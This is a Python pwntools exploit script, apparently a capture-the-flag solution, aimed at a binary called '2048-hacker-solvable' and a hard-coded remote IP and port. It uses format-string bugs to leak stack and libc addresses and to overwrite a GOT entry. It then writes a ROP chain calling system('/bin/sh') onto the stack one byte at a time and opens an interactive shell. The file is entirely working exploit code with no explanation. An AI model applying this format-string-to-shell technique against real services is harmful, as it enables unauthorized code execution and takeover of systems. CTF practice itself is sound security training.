from pwn import *
from icecream import ic

elf = exe = ELF("./2048-hacker-solvable")

context.binary = exe
# context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("54.85.45.101", 8007)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004015a9
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

if args.REMOTE:
    libc = ELF("./libc6_2.35-0ubuntu3.8_amd64.so")
else:
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
    
sl(b'%20$p')
ru("Skipping turn. Invalid command\n")
leak = int(rl().strip(), 16)

sl(f'%{elf.got['alarm']}c%20$n')
ru("Skipping turn. Invalid command\n")

sl(b'%14$s')
ru("Skipping turn. Invalid command\n")
libc.address = uu64(6) - libc.sym['alarm']

if args.REMOTE:
    x = 31
    y = 61
else:
    x = 32
    y = 63
sl(f'%{x}$p')
ru("Skipping turn. Invalid command\n")

stack = int(rl().strip(), 16)
if args.REMOTE:
    stack += 0x10
ic(hex(stack))
lsb = stack & 0xffff
lsb = lsb - 0x120


sl(f'%{lsb}c%{x}$hn')

payload = p64(qgad(libc, "rdi"))
payload += p64(binsh(libc))
payload += p64(gad(libc, ["ret"]))
payload += p64(libc.sym['system'])


for i in range(len(payload)):
    if payload[i] == 0:
        sl(f'%{y}$hhn')
        lsb += 1
        sl(f'%{lsb}c%{x}$hn')
    else:
        sl(f'%{payload[i]}c%{y}$hhn')
        lsb += 1
        sl(f'%{lsb}c%{x}$hn')


io.interactive()
